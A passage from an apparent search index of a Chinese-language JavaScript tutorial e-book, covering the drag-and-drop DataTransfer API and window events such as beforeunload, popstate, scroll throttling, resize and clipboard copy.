true;\n    }\n  }\n  return false;\n}\n\nlet isLink = containsFile(e.target.dataTransfer.types, 'text/uri-list');\nif (isLink) {\n  e.preventDefault();\n}\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#55-datatransferitems","title":"5.5 dataTransfer.items","text":"<p>\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u4f2a\u6570\u7ec4\uff08\u4f2a\u6570\u7ec4\u662f DataTransferItemList \u7684\u5b9e\u4f8b\uff09\uff0c\u5176\u4e2d\u6bcf\u4e00\u9879\u662f\u672c\u6b21\u62d6\u62fd\u7684\u4e00\u4e2a\u5bf9\u8c61\uff08\u5bf9\u8c61\u662fDataTransferItem \u7684\u5b9e\u4f8b\uff09\u3002\u5982\u679c\u62d6\u62fd\u4e0d\u5305\u542b\u5bf9\u8c61\uff0c\u90a3\u4e48\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002</p> <pre><code>// DataTransferItemList \u5b9e\u4f8b\u7684API\nlength\uff1a\u8fd4\u56de\u6210\u5458\u7684\u6570\u91cf\nadd(data, type)\uff1a\u589e\u52a0\u4e00\u4e2a\u6307\u5b9a\u5185\u5bb9\u548c\u7c7b\u578b\uff08\u6bd4\u5982text/html\u548ctext/plain\uff09\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u6210\u5458\nadd(file)\uff1aadd\u65b9\u6cd5\u7684\u53e6\u4e00\u79cd\u7528\u6cd5\uff0c\u589e\u52a0\u4e00\u4e2a\u6587\u4ef6\u4f5c\u4e3a\u6210\u5458\nremove(index)\uff1a\u79fb\u9664\u6307\u5b9a\u4f4d\u7f6e\u7684\u6210\u5458\nclear()\uff1a\u79fb\u9664\u6240\u6709\u7684\u6210\u5458\n\n// DataTransferItem \u5b9e\u4f8b\u7684API\nkind\uff1a\u8fd4\u56de\u6210\u5458\u7684\u79cd\u7c7b\uff08string\u8fd8\u662ffile\uff09\u3002\ntype\uff1a\u8fd4\u56de\u6210\u5458\u7684\u7c7b\u578b\uff08\u901a\u5e38\u662f MIME \u503c\uff09\u3002\ngetAsFile()\uff1a\u5982\u679c\u88ab\u62d6\u62c9\u662f\u6587\u4ef6\uff0c\u8fd4\u56de\u8be5\u6587\u4ef6\uff0c\u5426\u5219\u8fd4\u56denull\u3002\ngetAsString(callback)\uff1a\u5982\u679c\u88ab\u62d6\u62c9\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u5c06\u8be5\u5b57\u7b26\u4f20\u5165\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u5904\u7406\u3002\u8be5\u65b9\u6cd5\u662f\u5f02\u6b65\u7684\uff0c\u6240\u4ee5\u9700\u8981\u4f20\u5165\u56de\u8c03\u51fd\u6570\u3002\n</code></pre> <p>example</p> <pre><code>div.addEventListener('drop', function (e) {\n  e.preventDefault();\n  if (e.dataTransfer.items != null) {\n    for (var i = 0; i &lt; e.dataTransfer.items.length; i++) {\n      console.log(e.dataTransfer.items[i].kind + ': ' + e.dataTransfer.items[i].type);\n    }\n  }\n});\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#6","title":"6\u3001\u6570\u636e\u4f20\u8f93\u5668\u7684\u65b9\u6cd5","text":""},{"location":"ebook-JS-basic/09-Event/#61-setdata","title":"6.1 setdata \u7528\u6765\u8bbe\u7f6e\u62d6\u62c9\u4e8b\u4ef6\u6240\u5e26\u6709\u7684\u6570\u636e","text":"<pre><code>e.dataTransfer.setData('text/plain', 'this is Andy');\n</code></pre> <p>\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u5b57\u7b26\u4e32\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u6570\u636e\u7c7b\u578b\uff08\u6bd4\u5982<code>text/plain</code>\uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5177\u4f53\u6570\u636e\u3002\u5982\u679c\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u5728<code>dataTransfer</code>\u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u8fd9\u4e9b\u6570\u636e\u5c06\u88ab\u52a0\u5165\uff0c\u5426\u5219\u539f\u6709\u7684\u6570\u636e\u5c06\u88ab\u65b0\u6570\u636e\u66ff\u6362\u3002</p> <p>\u5982\u679c\u662f\u62d6\u62c9\u6587\u672c\u6846\u6216\u8005\u62d6\u62c9\u9009\u4e2d\u7684\u6587\u672c\uff0c\u4f1a\u9ed8\u8ba4\u5c06\u5bf9\u5e94\u7684\u6587\u672c\u6570\u636e\uff0c\u6dfb\u52a0\u5230<code>dataTransfer</code>\u5c5e\u6027\uff0c\u4e0d\u7528\u624b\u52a8\u6307\u5b9a\u3002</p> <pre><code>&lt;div draggable=\"true\"&gt;\n  aaa\n&lt;/div&gt;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u62d6\u62c9\u8fd9\u4e2a<code>&lt;div&gt;</code>\u5143\u7d20\u4f1a\u81ea\u52a8\u5e26\u4e0a\u6587\u672c\u6570\u636e<code>aaa</code>\u3002</p> <p>\u4f7f\u7528<code>setData</code>\u65b9\u6cd5\uff0c\u53ef\u4ee5\u66ff\u6362\u5230\u539f\u6709\u6570\u636e\u3002</p> <pre><code>&lt;div\n  draggable=\"true\"\n  ondragstart=\"event.dataTransfer.setData('text/plain', 'bbb')\"\n&gt;\n  aaa\n&lt;/div&gt;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u62d6\u62c9\u6570\u636e\u5b9e\u9645\u4e0a\u662f<code>bbb</code>\uff0c\u800c\u4e0d\u662f<code>aaa</code>\u3002</p> <p>\u4e0b\u9762\u662f\u6dfb\u52a0\u5176\u4ed6\u7c7b\u578b\u7684\u6570\u636e\u3002\u7531\u4e8e<code>text/plain</code>\u662f\u6700\u666e\u904d\u652f\u6301\u7684\u683c\u5f0f\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u517c\u5bb9\u6027\uff0c\u5efa\u8bae\u6700\u540e\u603b\u662f\u4fdd\u5b58\u4e00\u4efd\u7eaf\u6587\u672c\u683c\u5f0f\u7684\u6570\u636e\u3002</p> <pre><code>var dt = event.dataTransfer;\n\n// \u6dfb\u52a0\u94fe\u63a5\ndt.setData('text/uri-list', 'http://www.example.com');\ndt.setData('text/plain', 'http://www.example.com');\n\n// \u6dfb\u52a0 HTML \u4ee3\u7801\ndt.setData('text/html', 'Hello there, &lt;strong&gt;stranger&lt;/strong&gt;');\ndt.setData('text/plain', 'Hello there, &lt;strong&gt;stranger&lt;/strong&gt;');\n\n// \u6dfb\u52a0\u56fe\u50cf\u7684 URL\ndt.setData('text/uri-list', imageurl);\ndt.setData('text/plain', imageurl);\n</code></pre> <p>\u53ef\u4ee5\u4e00\u6b21\u63d0\u4f9b\u591a\u79cd\u683c\u5f0f\u7684\u6570\u636e\u3002</p> <pre><code>var dt = event.dataTransfer;\ndt.setData('application/x-bookmark', bookmarkString);\ndt.setData('text/uri-list', 'http://www.example.com');\ndt.setData('text/plain', 'http://www.example.com');\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7\u5728\u540c\u4e00\u4e2a\u4e8b\u4ef6\u4e0a\u9762\uff0c\u5b58\u653e\u4e09\u79cd\u7c7b\u578b\u7684\u6570\u636e\uff0c\u4f7f\u5f97\u62d6\u62c9\u4e8b\u4ef6\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u5bf9\u8c61\u4e0a\u9762\uff0c<code>drop</code>\u4e0d\u540c\u7684\u503c\u3002\u6ce8\u610f\uff0c\u7b2c\u4e00\u79cd\u683c\u5f0f\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u683c\u5f0f\uff0c\u6d4f\u89c8\u5668\u9ed8\u8ba4\u65e0\u6cd5\u8bfb\u53d6\uff0c\u8fd9\u610f\u5473\u7740\uff0c\u53ea\u6709\u67d0\u4e2a\u90e8\u7f72\u4e86\u7279\u5b9a\u4ee3\u7801\u7684\u8282\u70b9\uff0c\u624d\u53ef\u80fd<code>drop</code>\uff08\u8bfb\u53d6\u5230\uff09\u8fd9\u4e2a\u6570\u636e\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#62-datatransfergetdata","title":"6.2 DataTransfer.getData()","text":"<p><code>DataTransfer.getData()</code>\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u8868\u793a\u6570\u636e\u7c7b\u578b\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e8b\u4ef6\u6240\u5e26\u7684\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\uff08\u901a\u5e38\u662f\u7528<code>setData</code>\u65b9\u6cd5\u6dfb\u52a0\u7684\u6570\u636e\uff09\u3002\u5982\u679c\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u4e0d\u5b58\u5728\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002\u901a\u5e38\u53ea\u6709<code>drop</code>\u4e8b\u4ef6\u89e6\u53d1\u540e\uff0c\u624d\u80fd\u53d6\u51fa\u6570\u636e\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a<code>drop</code>\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u7528\u6765\u53d6\u51fa\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u3002</p> <pre><code>function onDrop(event) {\n  var data = event.dataTransfer.getData('text/plain');\n  event.target.textContent = data;\n  event.preventDefault();\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u53d6\u51fa\u62d6\u62c9\u4e8b\u4ef6\u7684\u6587\u672c\u6570\u636e\uff0c\u5c06\u5176\u66ff\u6362\u6210\u5f53\u524d\u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\u3002\u6ce8\u610f\uff0c\u8fd9\u65f6\u8fd8\u5fc5\u987b\u53d6\u6d88\u6d4f\u89c8\u5668\u7684\u9ed8\u8ba4\u884c\u4e3a\uff0c\u56e0\u4e3a\u5047\u5982\u7528\u6237\u62d6\u62c9\u7684\u662f\u4e00\u4e2a\u94fe\u63a5\uff0c\u6d4f\u89c8\u5668\u9ed8\u8ba4\u4f1a\u5728\u5f53\u524d\u7a97\u53e3\u6253\u5f00\u8fd9\u4e2a\u94fe\u63a5\u3002</p> <p><code>getData</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u5176\u4e2d\u5305\u542b\u591a\u9879\u6570\u636e\uff0c\u5c31\u5fc5\u987b\u624b\u52a8\u89e3\u6790\u3002</p> <pre><code>function doDrop(event) {\n  var lines = event.dataTransfer.getData('text/uri-list').split('\\n');\n  for (let line of lines) {\n    let link = document.createElement('a');\n    link.href = line;\n    link.textContent = line;\n    event.target.appendChild(link);\n  }\n  event.preventDefault();\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>getData</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u7ec4\u94fe\u63a5\uff0c\u5c31\u5fc5\u987b\u81ea\u884c\u89e3\u6790\u3002</p> <p>\u7c7b\u578b\u503c\u6307\u5b9a\u4e3a<code>URL</code>\uff0c\u53ef\u4ee5\u53d6\u51fa\u7b2c\u4e00\u4e2a\u6709\u6548\u94fe\u63a5\u3002</p> <pre><code>var link = event.dataTransfer.getData('URL');\n</code></pre> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u4ece\u591a\u79cd\u7c7b\u578b\u7684\u6570\u636e\u91cc\u9762\u53d6\u51fa\u6570\u636e\u3002</p> <pre><code>function doDrop(event) {\n  var types = event.dataTransfer.types;\n  var supportedTypes = ['text/uri-list', 'text/plain'];\n  types = supportedTypes.filter(function (value) { types.includes(value) });\n  if (types.length) {\n    var data = event.dataTransfer.getData(types[0]);\n  }\n  event.preventDefault();\n}\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#63-datatransfercleardata","title":"6.3 DataTransfer.clearData()","text":"<p><code>DataTransfer.clearData()</code>\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u8868\u793a\u6570\u636e\u7c7b\u578b\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c\u5220\u9664\u4e8b\u4ef6\u6240\u5e26\u7684\u6307\u5b9a\u7c7b\u578b\u7684\u6570\u636e\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7c7b\u578b\uff0c\u5219\u5220\u9664\u6240\u6709\u6570\u636e\u3002\u5982\u679c\u6307\u5b9a\u7c7b\u578b\u4e0d\u5b58\u5728\uff0c\u5219\u8c03\u7528\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u6548\u679c\u3002</p> <pre><code>event.dataTransfer.clearData('text/uri-list');\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6e05\u9664\u4e8b\u4ef6\u6240\u5e26\u7684<code>text/uri-list</code>\u7c7b\u578b\u7684\u6570\u636e\u3002</p> <p>\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u79fb\u9664\u62d6\u62c9\u7684\u6587\u4ef6\uff0c\u56e0\u6b64\u8c03\u7528\u8be5\u65b9\u6cd5\u540e\uff0c<code>DataTransfer.types</code>\u5c5e\u6027\u53ef\u80fd\u4f9d\u7136\u4f1a\u8fd4\u56de<code>Files</code>\u7c7b\u578b\uff08\u524d\u63d0\u662f\u5b58\u5728\u6587\u4ef6\u62d6\u62c9\uff09\u3002</p> <p>\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728<code>dragstart</code>\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e4b\u4e2d\u4f7f\u7528\uff0c\u56e0\u4e3a\u8fd9\u662f\u62d6\u62c9\u64cd\u4f5c\u7684\u6570\u636e\u552f\u4e00\u53ef\u5199\u7684\u65f6\u673a\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#4datatransfersetdragimage","title":"4\u3001DataTransfer.setDragImage()","text":"<p>\u62d6\u52a8\u8fc7\u7a0b\u4e2d\uff08<code>dragstart</code>\u4e8b\u4ef6\u89e6\u53d1\u540e\uff09\uff0c\u6d4f\u89c8\u5668\u4f1a\u663e\u793a\u4e00\u5f20\u56fe\u7247\u8ddf\u968f\u9f20\u6807\u4e00\u8d77\u79fb\u52a8\uff0c\u8868\u793a\u88ab\u62d6\u52a8\u7684\u8282\u70b9\u3002\u8fd9\u5f20\u56fe\u7247\u662f\u81ea\u52a8\u521b\u9020\u7684\uff0c\u901a\u5e38\u663e\u793a\u4e3a\u88ab\u62d6\u52a8\u8282\u70b9\u7684\u5916\u89c2\uff0c\u4e0d\u9700\u8981\u81ea\u5df1\u52a8\u624b\u8bbe\u7f6e\u3002</p> <p><code>DataTransfer.setDragImage()</code>\u65b9\u6cd5\u53ef\u4ee5\u81ea\u5b9a\u4e49\u8fd9\u5f20\u56fe\u7247\u3002\u5b83\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u662f<code>&lt;img&gt;</code>\u8282\u70b9\u6216\u8005<code>&lt;canvas&gt;</code>\u8282\u70b9\uff0c\u5982\u679c\u7701\u7565\u6216\u4e3a<code>null</code>\uff0c\u5219\u4f7f\u7528\u88ab\u62d6\u52a8\u7684\u8282\u70b9\u7684\u5916\u89c2\uff1b\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e3a\u9f20\u6807\u76f8\u5bf9\u4e8e\u8be5\u56fe\u7247\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u53f3\u5750\u6807\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>/* HTML \u4ee3\u7801\u5982\u4e0b\n &lt;div id=\"drag-with-image\" class=\"dragdemo\" draggable=\"true\"&gt;\n   drag me\n &lt;/div&gt;\n*/\n\nvar div = document.getElementById('drag-with-image');\ndiv.addEventListener('dragstart', function (e) {\n  var img = document.createElement('img');\n  img.src = 'http://path/to/img';\n  e.dataTransfer.setDragImage(img, 0, 0);\n}, false);\n</code></pre> <p>\u56e0\u4e3a\u539f\u751f\u7684\u62d6\u62fd\u4e8b\u4ef6\u6bd4\u8f83\u7e41\u7410\uff0c\u6240\u4ee5 react \u4e2d\u901a\u5e38\u4f7f\u7528 react-dnd \u5b9e\u73b0\u62d6\u62fd\u6548\u679c\uff08\u4f7f\u7528 dnd \u9ad8\u9636\u7ec4\u4ef6\u5305\u88f9\uff0c\u7c7b\u4f3c redux \u7684\u4f20\u503c\uff09</p>"},{"location":"ebook-JS-basic/09-Event/#910","title":"9.10 \u5176\u4ed6\u4e8b\u4ef6","text":""},{"location":"ebook-JS-basic/09-Event/#1beforeunload","title":"1\u3001beforeunload","text":"<p>\u7a97\u53e3\u3001\u6587\u6863\u3001\u5404\u79cd\u8d44\u6e90\u5378\u8f7d\u524d\u89e6\u53d1\u4e8b\u4ef6\uff0c\u4e3b\u8981\u907f\u514d\u7528\u6237\u672a\u63d0\u4ea4\u4fdd\u5b58\u8868\u5355\uff0c\u8bef\u64cd\u4f5c\u5173\u95ed\u7f51\u9875\u3002</p> <pre><code>window.addEventListener('beforeunload', (e) =&gt; {\n  var confirmationMessage = '\u786e\u8ba4\u5173\u95ed\u7a97\u53e3\uff1f';\n  e.returnValue = confirmationMessage;\n  return confirmationMessage;\n});\n// \u4f7f\u7528 e.returnValue \u548c return \u53ef\u4ee5\u4fdd\u8bc1\u517c\u5bb9\u6027\u3002\u5bf9\u4e8eIE\u6d4f\u89c8\u5668\u53ef\u4ee5\u663e\u793a\u63d0\u793a\u6587\u672c\uff0c\u8c37\u6b4c\u6d4f\u89c8\u5668\u4f1a\u663e\u793a\u9ed8\u8ba4\u6587\u672c\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#2unload","title":"2\u3001unload","text":"<p>\u5728\u7a97\u53e3\u5173\u95ed\u6216\u8005DOM\u88ab\u5378\u8f7d\u524d\u6267\u884c\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u53d1\u751f\u5728 beforeUnload \u4e4b\u540e\u3002\u8fd9\u4e2a\u4e8b\u4ef6\u5982\u679c\u629b\u51fa\u5f02\u5e38\uff0c\u754c\u9762DOM\u4f9d\u7136\u4f1a\u5378\u8f7d\uff0c\u6587\u6863\u4e0d\u53ef\u89c1\uff0cUI\u4ea4\u4e92\u5931\u6548\uff0c\u6240\u4ee5\u57fa\u672c\u4e0d\u7528\u3002</p> <pre><code>window.addEventListener('unload', (e) =&gt; {\n  console.log('never use this event')\n});\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#3load-error-abort","title":"3\u3001load error abort","text":"<p>\u8d44\u6e90\u52a0\u8f7d\u5b8c\u6bd5\uff0c\u8d44\u6e90\u51fa\u9519\uff0c\u7528\u6237\u53d6\u6d88\u8d44\u6e90\u52a0\u8f7d\u89e6\u53d1\u4e8b\u4ef6\uff0c window\uff0cDOM\uff0c AJax \u8bf7\u6c42\u90fd\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002\u6ce8\u610f\uff1a\u7f51\u9875\u4ece\u672c\u5730\u7f13\u5b58\u4e2d\u52a0\u8f7d\u4e0d\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002</p> <pre><code>window.addEventListener('load', (e) =&gt; {\n  ...\n});\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#4pageshow-pagehide","title":"4\u3001pageshow pagehide","text":"<p>\u7f51\u9875\u52a0\u8f7d\u7684\u4e24\u79cd\u65b9\u5f0f\uff1a\u4ece\u670d\u52a1\u5668\u7aef\u83b7\u53d6\u8d44\u6e90\u52a0\u8f7d\uff0c\u6216\u8005\u4ece\u7f13\u5b58\u4e2d\u52a0\u8f7d\uff08\u70b9\u51fb\u524d\u8fdb\u6216\u8005\u540e\u9000\u6309\u94ae\uff09\u3002</p> <p>load \u4e8b\u4ef6\u4f1a\u5728\u9996\u6b21\u52a0\u8f7d\u89e6\u53d1\uff0c\u5982\u679c\u4ece\u7f13\u5b58\u4e2d\u52a0\u8f7d\u5c31\u4e0d\u4f1a\u89e6\u53d1\u3002</p> <p>pageshow\u4e8b\u4ef6\uff0c\u5728\u9996\u6b21\u52a0\u8f7d\u6216\u8005\u7f13\u5b58\u52a0\u8f7d\u90fd\u4f1a\u89e6\u53d1\uff08\u9996\u6b21\u52a0\u8f7d\u4e2d\uff0cload\u5148\u89e6\u53d1\uff0cpageshow\u540e\u89e6\u53d1\uff09\u3002\u901a\u8fc7 pageshow \u7684 e.persisted \u53ef\u4ee5\u5224\u65ad\u662f\u5426\u9996\u6b21\u52a0\u8f7d\uff1a\u5982\u679c\u662ftrue\u5c31\u662f\u4ece\u7f13\u5b58\u4e2d\u52a0\u8f7d\uff0cfalse\u8868\u793a\u9996\u6b21\u52a0\u8f7d\u3002</p> <p>pagehide \u4e8b\u4ef6\u4f1a\u5728\u754c\u9762\u5173\u95ed\u524d\u89e6\u53d1\uff0c\u5982\u679c e.persisted \u662f true, \u9875\u9762\u4f1a\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\uff1bfalse \u8868\u793a\u4e0d\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\u3002</p> <p>Pageshow pagehide \u5728 history \u5bf9\u8c61\u53d8\u5316\u65f6\u89e6\u53d1\uff0c\u548c\u7f51\u9875\u662f\u5426\u53ef\u89c1\u65e0\u5173\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#5popstate","title":"5\u3001popstate","text":"<p>\u8fd9\u4e2a\u4e8b\u4ef6\u5728 history \u5bf9\u8c61\u663e\u793a\u5207\u6362\u65f6\u89e6\u53d1\uff08\u9f20\u6807\u70b9\u51fb\u524d\u8fdb\u540e\u9000\uff0chistory.back(), history.forward(), history.go() \u89e6\u53d1\uff09\u3002\u9690\u5f0f\u5207\u6362\u4e0d\u4f1a\u89e6\u53d1(history.pushState(), history.replaceState())\u3002</p> <p>FF\u754c\u9762\u9996\u6b21\u52a0\u8f7d\u4e0d\u4f1a\u89e6\u53d1 popstate \u4e8b\u4ef6\uff0c\u5176\u4ed6\u4f1a\u89e6\u53d1\u3002</p> <pre><code>window.onpopstate = function (event) {\n  console.log('state: ' + event.state);\n  // \u83b7\u53d6\u5f53\u524d\u4e8b\u4ef6\u7684\u72b6\u6001\n};\nhistory.pushState({page: 1}, 'title 1', '?page=1'); // \u9690\u5f0f\u589e\u52a0\u4e00\u6761\u8bb0\u5f55\uff0c\u4e0d\u4f1a\u89e6\u53d1\u4e8b\u4ef6\nhistory.pushState({page: 2}, 'title 2', '?page=2'); // \u9690\u5f0f\u589e\u52a0\u4e00\u6761\u8bb0\u5f55\nhistory.replaceState({page: 3}, 'title 3', '?page=3'); // \u6539\u53d8\u5f53\u524d\u7684\u8bb0\u5f55\uff0c\u4e0d\u4f1a\u89e6\u53d1\nhistory.back(); // state: {\"page\":1} \u9875\u9762\u540e\u9000\u4e00\u6b21\nhistory.back(); // state: null  \u9875\u9762\u518d\u540e\u9000\u4e00\u6b21\nhistory.go(2);  // state: {\"page\":3} \u9875\u9762\u5411\u524d\u4e24\u6b21\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#6hashchange","title":"6\u3001hashchange","text":"<p>hash \u53d8\u5316\u662f\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u901a\u8fc7\u5c5e\u6027\u53ef\u4ee5\u83b7\u53d6\u524d\u540e\u7684\u5b8c\u6574 URL\u3002</p> <pre><code>window.addEventListener('hashchange', (e) =&gt; {\n  console.log(e.oldURL)\n  console.log(e.newURL)\n});\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#7domcontentloaded","title":"7\u3001DOMContentLoaded","text":"<p>\u8fd9\u4e2a\u4e8b\u4ef6\u662f DOM \u52a0\u8f7d\u5b8c\u6210\uff0c\u4f46\u662f\u5176\u4ed6\u8d44\u6e90\uff08image\uff09\u8fd8\u6ca1\u6709\u52a0\u8f7d\u89e6\u53d1\u7684\u4e8b\u4ef6\uff0c\u6bd4load \u4e8b\u4ef6\u66f4\u65e9\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#8readystatechange","title":"8\u3001readystatechange","text":"<p>\u7f51\u9875\u52a0\u8f7d\u72b6\u6001\u53d8\u5316\u89e6\u53d1\u4e8b\u4ef6\uff08loading -&gt; interactive -&gt; complete -&gt; load\uff09</p>"},{"location":"ebook-JS-basic/09-Event/#9scroll","title":"9\u3001scroll","text":"<p>\u754c\u9762\u6eda\u52a8\u89e6\u53d1\uff0c\u4f7f\u7528\u5f88\u591a\u3002</p> <p>\u8fd9\u4e2a\u4e8b\u4ef6\u5728\u754c\u9762\u6eda\u52a8\u65f6\u4f1a\u6301\u7eed\u89e6\u53d1\uff0c\u9700\u8981\u8003\u8651\u6027\u80fd\u95ee\u9898\u3002</p> <p>\u65b9\u6cd51\uff1a\u53ef\u4ee5\u4f7f\u7528requestAnimationFrame\u4f18\u5316\u3002\u754c\u9762\u6bcf\u6b21\u91cd\u7ed8(\u6bcf\u79d260\u6b21)\uff0c\u53ea\u4f1a\u89e6\u53d1\u4e00\u6b21scroll\u4e8b\u4ef6</p> <pre><code>(function () {\n  var throttle = function (type, name, obj) {\n    var obj = obj || window;\n    var running = false;\n    var func = function () {\n      if (running) { return; }\n      running = true;\n      // \u754c\u9762\u6bcf\u6b21\u91cd\u7ed8(\u6bcf\u79d260\u6b21)\uff0c\u53ea\u4f1a\u89e6\u53d1\u4e00\u6b21scroll\u4e8b\u4ef6\n      requestAnimationFrame(function() {\n        obj.dispatchEvent(new CustomEvent(name));\n        running = scroll\n      });\n    };\n    obj.addEventListener(type, func);\n  };\n  // \u5c06 scroll \u4e8b\u4ef6\u91cd\u5b9a\u4e49\u4e3a optimizedScroll \u4e8b\u4ef6\n  throttle('scroll', 'optimizedScroll');\n})();\n\nwindow.addEventListener('optimizedScroll', function() {\n  console.log('Resource conscious scroll callback!');\n});\n</code></pre> <p>\u65b9\u6cd52\uff1a\u53ef\u4ee5\u4f7f\u7528 setTimeout \u589e\u52a0\u95f4\u9694\u65f6\u95f4\uff080.1 \u79d2\u6267\u884c\u4e00\u6b21\uff09</p> <pre><code>(function() {\n  window.addEventListener('scroll', scrollThrottler, false);\n  var scrollTimeout;\n  function scrollThrottler() {\n    if (!scrollTimeout) {\n      scrollTimeout = setTimeout(function () {\n        scrollTimeout = null;\n        actualScrollHandler();\n      }, 100);\n    }\n  }\n  function actualScrollHandler() {\n    // ...\n  }\n}());\n</code></pre> <p>\u65b9\u6cd53\uff1a 1\u79d2\u4e00\u6b21</p> <pre><code>function throttle(fn, wait) {\n  var time = Date.now();\n  return function() {\n    if ((time + wait - Date.now()) &lt; 0) {\n      fn();\n      time = Date.now();\n    }\n  }\n}\n\nwindow.addEventListener('scroll', throttle(callback, 1000));\n</code></pre> <p>\u65b9\u6cd54\uff1alodash\u5e93\u51fd\u6570</p> <pre><code>window.addEventListener('scroll', _.throttle(callback, 1000));\n</code></pre> <p>\u8282\u6d41\u548c\u9632\u6296\u7684\u533a\u522b\uff1a</p> <p>debounce \u662f\u9632\u6296\uff0cthrottle \u662f\u8282\u6d41\u3002\u8282\u6d41\u8868\u793a\u754c\u9762\u6eda\u52a8\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u51fd\u6570\u6267\u884c\u4e00\u6b21\uff0c\u9632\u6296\u662f\u754c\u9762\u6eda\u52a8\u505c\u6b62\u540e\uff0c\u6267\u884c\u4e00\u6b21\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#10resize","title":"10\u3001resize","text":"<p>\u6539\u53d8\u754c\u9762\u5927\u5c0f\u89e6\u53d1\uff08\u4f1a\u9891\u7e41\u89e6\u53d1\uff0c\u9700\u8981\u8282\u6d41\u9600\uff09\uff0c\u4e3b\u8981\u53d1\u751f\u5728window\u4e0a\u9762\u3002\u8fd9\u91cc\u53ef\u4ee5\u5904\u7406PC\u7aef\u754c\u9762\u5411\u79fb\u52a8\u7aef\u754c\u9762\u5207\u6362\u65f6\u89e6\u53d1\u7684\u51fd\u6570\u3002</p> <pre><code>window.addEventListener('resize', (e) =&gt; {\n  if (document.body.clientWidth &lt; 768) {\n    // mobile\n  }\n}, true);\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#11fullscreenchange-fullscreenerror","title":"11\u3001fullscreenchange fullscreenerror","text":"<p>Fullscreenchange \u5728\u5f00\u542f\u6216\u8005\u9000\u51fa\u5168\u5c4f\u89e6\u53d1\uff0cfullscreenerror \u4f1a\u5728\u5168\u5c4f\u51fa\u9519\u65f6\u89e6\u53d1\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#12","title":"12\u3001\u526a\u5207\u677f\u4e8b\u4ef6","text":"<p>cut copy paste \u662f clipboardevent \u7684\u5b9e\u4f8b\u4e8b\u4ef6\uff0c\u5177\u6709\u4e00\u4e2a\u5c5e\u6027 dataTransfer\uff0c\u53ef\u4ee5\u5b58\u653e\u526a\u5207\u7684\u6570\u636e\u3002</p> <pre><code>document.addEventListener('copy', function (e) {\n  e.clipboardData.setData('text/plain', '\u7248\u6743\u6240\u6709\uff0c\u4e0d\u5f97\u590d\u5236');\n  e.clipboardData.setData('text/html', '&lt;b&gt;Hello, 